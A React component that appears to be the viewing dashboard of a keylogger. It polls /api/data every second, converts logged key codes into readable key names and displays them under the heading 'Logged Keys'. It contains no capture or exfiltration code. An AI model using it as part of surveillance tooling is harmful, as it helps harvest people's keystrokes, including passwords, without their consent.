import { useEffect, useState } from 'react';

export default function View() {
  const [data, setData] = useState([]);

  useEffect(() => {
    const fetchKeys = async () => {
      try {
        const res = await fetch("/api/data");
        const json = await res.json();
        if (Array.isArray(json)) {
          setData(json);
        } else {
          console.error("Unexpected API response:", json);
        }
      } catch (err) {
        console.error("Fetch error:", err);
      }
    };

    fetchKeys();
    const interval = setInterval(fetchKeys, 1000);
    return () => clearInterval(interval);
  }, []);

  const decodeKey = (code) => {
    const keyMap = {
      8: 'Backspace', 9: 'Tab', 13: 'Enter', 16: 'Shift', 17: 'Control',
      18: 'Alt', 19: 'Pause/Break', 20: 'CapsLock', 27: 'Escape', 32: ' ',
      33: 'Page Up', 34: 'Page Down', 35: 'End', 36: 'Home', 37: 'ArrowLeft',
      38: 'ArrowUp', 39: 'ArrowRight', 40: 'ArrowDown', 45: 'Insert', 46: 'Delete',
      91: 'Meta', 93: 'ContextMenu',
      112: 'F1', 113: 'F2', 114: 'F3', 115: 'F4', 116: 'F5',
      117: 'F6', 118: 'F7', 119: 'F8', 120: 'F9', 121: 'F10',
      122: 'F11', 123: 'F12'
    };

    if (keyMap[code]) return keyMap[code];
    // For alphanumeric keys, directly convert the code to a character
    if ((code >= 48 && code <= 57) || // Numbers 0-9
        (code >= 65 && code <= 90) || // Uppercase A-Z
        (code >= 97 && code <= 122)) { // Lowercase a-z
      return String.fromCharCode(code);
    }
    return `[${code}]`; // Keep the bracketed code for unmapped keys
  };

  return (
    <div style={{
      backgroundColor: "#fff", // Ensure white background (can be overridden by CSS)
      minHeight: "100vh",
      padding: "2rem",
      color: "#000", // Default to black text (can be overridden by CSS)
      fontFamily: "'Courier New', monospace",
      fontSize: "1.2rem", // Match base font size from CSS
      fontWeight: "normal"
    }}>
      <h1 style={{
        color: "#000", // Default to black heading (can be overridden by CSS)
        fontSize: "1.6rem", // Match heading size from CSS
        marginBottom: "0.8rem",
        fontWeight: "normal"
      }}>
        Logged Keys
      </h1>

      <div className="key-logger-box">
        {data.length > 0 ? (
          data.map((code, index) => (
            <span key={index} className="key">
              {decodeKey(code)}
            </span>
          ))
        ) : (
          <span className="no-keys">No keys logged yet...</span>
        )}
      </div>
    </div>
  );
}
